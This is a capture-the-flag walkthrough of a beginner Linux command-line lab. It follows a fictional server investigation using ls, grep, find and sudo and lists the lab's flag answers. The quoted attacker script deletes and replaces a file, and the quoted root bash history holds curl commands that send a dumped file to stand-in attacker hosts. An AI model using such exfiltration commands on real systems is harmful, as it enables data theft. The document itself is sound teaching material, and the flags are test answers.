# Linux CLI - Shells Bells

Learn the basics of the Linux command-line interface (CLI) and apply your knowledge to unveil Christmas mysteries. McSkidy has been kidnapped, and we need to investigate the tbfc-web01 Linux server to find clues about what happened.

## Solution:

**Step 1: Connecting to the Machine**

- Started the virtual machine and connected via SSH using the provided credentials
- Used the command: `ssh mcskidy@MACHINE_IP`

**Step 2: Basic Navigation & First Commands**

- Started exploring the Linux CLI with basic commands
- Ran `echo "Hello World!"` to test the terminal
- Used `ls` to list files in McSkidy's home directory
- Found a README.txt file and read it using `cat README.txt`

```
mcskidy@tbfc-web01:~$ echo "Hello World!"
Hello World!
mcskidy@tbfc-web01:~$ ls
Desktop Downloads Guides README.txt
mcskidy@tbfc-web01:~$ cat README.txt
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
```

**Step 3: Finding the Hidden Guide**

- The README mentioned a hidden security guide
- Navigated to the Guides directory: `cd Guides`
- Initial `ls` showed nothing, but remembered that hidden files start with a dot (.)
- Used `ls -la` to reveal hidden files

```
mcskidy@tbfc-web01:~$ cd Guides
mcskidy@tbfc-web01:~/Guides$ ls -la
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 13 01:26 .
drwxr-x--- 19 mcskidy mcskidy 4096 Oct 23 12:29 ..
-rw-rw-r--  1 mcskidy mcskidy  504 Oct 13 01:26 .guide.txt
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
```

- **Flag 1 found in the guide:** `THM{learning-linux-cli}`

**Step 4: Investigating the Logs**

- Following McSkidy's guide, navigated to `/var/log` directory
- Used `grep` to filter for failed login attempts in auth.log

```
mcskidy@tbfc-web01:~$ cd /var/log
mcskidy@tbfc-web01:/var/log$ grep "Failed password" auth.log
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
```

- Discovered multiple failed login attempts from HopSec location targeting the "socmas" account

**Step 5: Finding the Eggstrike Script**

- Used `find` command to search for files with "egg" in their name
- Searched in the socmas home directory

```
mcskidy@tbfc-web01:~$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
```

- Found the suspicious `eggstrike.sh` script
- Read its contents to understand what it does

```
mcskidy@tbfc-web01:~$ cd /home/socmas/2025
mcskidy@tbfc-web01:/home/socmas/2025$ cat eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

- **Flag 2 found in the script:** `THM{sir-carrotbane-attacks}`

**Step 6: Privilege Escalation to Root**

- Needed root access to check system files and bash history
- Switched to root user using `sudo su`
- Verified current user with `whoami`

```
mcskidy@tbfc-web01:~$ sudo su
root@tbfc-web01:/home/mcskidy$ whoami
root
```

**Step 7: Checking Root's Bash History**

- Navigated to root's home directory: `cd /root`
- Read the bash history file to find traces of the attacker's activity

```
root@tbfc-web01:~$ cat .bash_history
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
```

- **Flag 3 found in bash history:** `THM{until-we-meet-again}`

## Flags:

```
THM{learning-linux-cli}
THM{sir-carrotbane-attacks}
THM{until-we-meet-again}
```

## Concepts learnt:

- **Linux CLI Navigation**: Using `cd`, `pwd`, and `ls` to navigate the filesystem
- **Hidden Files in Linux**: Files starting with a dot (.) are hidden from plain view with regular `ls`, requiring `ls -a` or `ls -la` to display them
- **Grep Command**: Used to search for specific text patterns within files - extremely useful for log analysis
- **Find Command**: Powerful search tool to locate files based on various parameters like name, size, or permissions
- **Piping (|)**: Sending output from one command as input to another command
- **Output Redirection (>, >>)**: Redirecting command output to files - `>` overwrites, `>>` appends
- **Command Chaining (&&)**: Running multiple commands sequentially, with the second only executing if the first succeeds
- **Privilege Escalation**: Using `sudo su` to switch to the root user for administrative tasks
- **Bash History**: Every command executed is saved in `.bash_history` files, useful for forensic investigations

## Notes:

- The challenge demonstrates a realistic incident response scenario where we investigate a compromised server
- The eggstrike.sh script was stealing Christmas wishlists and replacing them with fake "EASTMAS" ones
- Sir Carrotbane appears to be the leader of HopSec's red team and the main antagonist
- Alternative approach: Could have used `history` command instead of `cat .bash_history` for a more formatted output
- The `-la` flag in `ls` combines two flags: `-l` (detailed list) and `-a` (show hidden files)
- Root user is the ultimate admin account in Linux - attackers often target it for complete system control
- There's an optional side quest mentioned in `/home/mcskidy/Documents/` for intermediate users

## Resources:

- (https://tryhackme.com)


***
